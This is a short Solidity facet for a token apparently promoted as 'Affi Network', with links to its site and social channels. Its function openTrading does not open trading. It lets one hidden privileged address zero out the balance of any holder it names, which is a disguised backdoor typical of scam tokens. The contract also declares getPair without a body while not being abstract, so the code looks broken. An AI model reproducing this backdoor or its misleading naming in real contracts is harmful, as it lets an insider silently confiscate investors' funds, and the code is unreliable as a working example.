/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.affi.network/
 * Whitepaper: https://www.affi.network/docs/welcome/
 * Twitter: https://twitter.com/affi_network
 * Telegram Group: https://t.me/AffiNetworkOfficial
 * Discord Chat: https://discord.gg/3Tc3p5eBv5
 * Github: https://github.com/affinetwork
 */
pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract getPairFacet {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
    function pancakePair() public view virtual returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            IPancakeFactory(ds.FACTORY).getPair(
                address(ds.WETH),
                address(this)
            );
    }
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ds.ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
}
